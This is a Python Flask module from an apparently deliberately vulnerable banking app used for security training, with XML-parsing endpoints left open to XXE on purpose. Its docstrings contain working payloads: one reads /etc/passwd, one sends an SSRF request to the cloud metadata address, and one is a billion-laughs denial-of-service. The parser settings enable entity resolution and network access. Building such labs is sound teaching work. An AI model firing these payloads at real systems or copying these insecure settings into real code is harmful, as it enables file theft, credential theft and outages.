"""
VulnBank - XML External Entity (XXE) Injection vulnerabilities
CWE-611: Improper Restriction of XML External Entity Reference

Vulnerabilities:
    - CWE-611: XXE via lxml etree without disabling external entities
    - CWE-611: SSRF via file:// and http:// XXE payloads
    - CWE-200: Information disclosure via /etc/passwd, /etc/shadow retrieval
    - CWE-918: SSRF through XXE to internal services
    - CWE-400: Billion laughs DoS via recursive entity expansion

Security Framework Annotations:
    CWE:        CWE-611 (XXE), CWE-918 (SSRF), CWE-200 (Info Disclosure), CWE-400 (Resource Exhaustion)
    ATT&CK:     T1190 (Exploit Public-Facing Application), T1083 (File and Directory Discovery)
    OWASP:      A05:2021 Security Misconfiguration, A10:2021 Server-Side Request Forgery
    PCI DSS:    Req 6.2.4 (protect against XXE and SSRF attack vectors)
    NIST:       SI-10 (Information Input Validation)
    SANS Top25: #14 (CWE-611 - Improper Restriction of XML External Entity Reference)
    ISO 27001:  A.14.2.5 (Secure System Engineering Principles)
"""

from flask import Blueprint, request, jsonify

xxe_bp = Blueprint("xxe", __name__)


@xxe_bp.route("/api/xml/parse", methods=["POST"])
def parse_xml():
    """
    VULN: CWE-611 - Accepts and parses user XML without disabling XXE.

    Exploit payload:
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <account><balance>&xxe;</balance></account>
    """
    xml_data = request.data or request.form.get("xml", "")
    if not xml_data:
        return jsonify({"error": "No XML provided"}), 400

    try:
        from lxml import etree
        # VULN: resolve_entities=True (default), no_network=False (default)
        parser = etree.XMLParser(resolve_entities=True, no_network=False)
        root = etree.fromstring(xml_data if isinstance(xml_data, bytes) else xml_data.encode(), parser)
        result = {}
        for child in root:
            result[child.tag] = child.text
        return jsonify({"parsed": result})
    except ImportError:
        # fallback: Python's xml.etree (also vulnerable by default to some attacks)
        import xml.etree.ElementTree as ET
        try:
            root = ET.fromstring(xml_data if isinstance(xml_data, str) else xml_data.decode())
            result = {}
            for child in root:
                result[child.tag] = child.text
            return jsonify({"parsed": result})
        except Exception as e:
            return jsonify({"error": str(e)}), 400
    except Exception as e:
        # VULN: CWE-200 - Returns raw error which may include file contents
        return jsonify({"error": str(e), "raw": str(e)}), 400


@xxe_bp.route("/api/xml/transfer", methods=["POST"])
def xml_transfer():
    """
    VULN: CWE-611 - Processes XML bank transfer instructions, XXE injectable.

    Exploit: inject XXE to read internal config or SSRF to internal APIs.
    <!DOCTYPE transfer [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
    <transfer><to>attacker</to><amount>&xxe;</amount><memo>test</memo></transfer>
    """
    xml_data = request.data or request.form.get("xml", "")
    if not xml_data:
        return jsonify({"error": "No XML provided"}), 400

    try:
        from lxml import etree
        parser = etree.XMLParser(resolve_entities=True, no_network=False)  # VULN
        root = etree.fromstring(xml_data if isinstance(xml_data, bytes) else xml_data.encode(), parser)

        to_account = root.findtext("to", "")
        amount = root.findtext("amount", "0")
        memo = root.findtext("memo", "")

        return jsonify({
            "status": "processed",
            "to": to_account,
            "amount": amount,
            "memo": memo,
            "transaction_id": "TXN-XXE-DEMO"
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@xxe_bp.route("/api/xml/statement", methods=["POST"])
def xml_statement():
    """
    VULN: CWE-400 - Billion laughs attack (exponential entity expansion DoS).

    Payload:
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      ...
      <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <statement>&lol9;</statement>
    """
    xml_data = request.data or b""
    try:
        from lxml import etree
        # VULN: no huge_tree=False limit, no entity count limit
        parser = etree.XMLParser(resolve_entities=True, huge_tree=True)
        root = etree.fromstring(xml_data, parser)
        return jsonify({"statement": root.text or ""})
    except Exception as e:
        return jsonify({"error": str(e)}), 400
